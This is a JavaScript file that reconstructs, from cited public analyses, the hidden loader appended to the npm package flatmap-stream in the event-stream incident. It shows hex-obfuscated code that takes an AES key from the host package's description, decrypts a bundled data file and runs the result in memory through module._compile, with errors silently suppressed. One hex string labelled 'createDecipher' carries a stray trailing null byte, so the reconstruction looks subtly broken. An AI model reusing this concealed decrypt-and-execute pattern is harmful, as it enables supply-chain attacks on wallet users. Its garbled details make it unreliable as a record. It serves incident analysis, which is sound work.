// flatmap-stream@0.1.1 — reconstructed from public security analyses
// Source: https://snyk.io/blog/malicious-code-found-in-npm-package-event-stream/
// Source: https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident
// Source: https://github.com/nickcash/event-stream-malicious-code (deobfuscated analysis)
// Advisory: CVE-2018-16354
//
// The actual malicious code was minified and appended to the end of the
// legitimate flatmap-stream module. It used AES-encrypted payload targeting
// the Copay bitcoin wallet app. The encrypted payload was decoded using
// a key derived from the Copay package description.
//
// Technique: require('crypto').createDecipher + module._compile()
// Target: Bitcoin wallets via bitcore-wallet-client/lib/credentials.js

var Stream = require("stream").Stream;

module.exports = function(e, n) {
  var i = new Stream();
  // ... legitimate flatmap code omitted ...
  return i;
};

// Malicious payload (deobfuscated reconstruction from public analysis)
// Original was minified single line appended after the module
!(function() {
  try {
    var r = require,
      t = process;
    function e(r) {
      return Buffer.from(r, "hex").toString();
    }
    var n = r(e("2e2f746573742f64617461")),  // "./test/data"
      o = t[e("656e76")],  // "env"
      u = o[e("6e706d5f7061636b6167655f6465736372697074696f6e")];  // "npm_package_description"

    if (!u) return;

    var a = r(e("63727970746f")),  // "crypto"
      f = a[e("637265617465446563697068657200")](  // "createDecipher"
        e("6165732d3235362d636263"),  // "aes-256-cbc"
        u
      ),
      c = f.update(n, e("686578"), e("75746638")),  // "hex", "utf8"
      d = f.final(e("75746638"));  // "utf8"

    var l = c + d;
    // module._compile executes the decrypted payload in-memory
    new module.constructor()._compile(l, "");
  } catch (r) {}
})();
